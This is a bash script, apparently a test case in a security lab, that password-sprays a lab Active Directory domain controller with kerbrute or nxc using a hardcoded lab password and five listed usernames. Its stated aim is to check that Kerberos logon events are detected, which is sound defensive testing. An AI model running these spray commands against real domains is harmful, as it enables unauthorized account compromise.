#!/usr/bin/env bash
# T031 — Password spray against dc01 (cadre.local) using lab wordlist
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CADRE_ROOT="${CADRE_ROOT:-${HOME}/CADRE}"
WORDLIST="${CADRE_ROOT}/ansible/files/cadre_passwords.txt"
USERS="${USERS_FILE:-/tmp/cadre-spray-users.txt}"
echo "=== T031 password spray ==="
if [[ ! -f "${WORDLIST}" ]]; then
  echo "T031_FAIL: missing ${WORDLIST}" >&2
  exit 1
fi
cat > "${USERS}" <<'EOF'
chief_command
hunter_dfir
analyst_dfir
analyst_cloud
eng_agentic
EOF
if command -v kerbrute >/dev/null 2>&1; then
  # Single known-pass spray (lab) — validates 4768/4771 path without long brute
  kerbrute passwordspray -d cadre.local --dc 192.168.77.10 "${USERS}" 'C0mm@nd_Ch1ef!' || true
  echo "T031_KERBRUTE_DONE"
elif command -v nxc >/dev/null 2>&1; then
  nxc smb 192.168.77.10 -u "${USERS}" -p 'C0mm@nd_Ch1ef!' --continue-on-success || true
  echo "T031_NXC_DONE"
else
  # Minimal AS-REQ style check via python Impacket if available
  python3 - <<'PY' || true
from pathlib import Path
users = Path("/tmp/cadre-spray-users.txt").read_text().split()
print("T031_USERS", users)
print("T031_NO_SPRAY_TOOL — install kerbrute or nxc; wordlist present")
PY
  echo "T031_SURFACE_OK wordlist=$(wc -l < "${WORDLIST}")"
fi
echo "T031 complete"
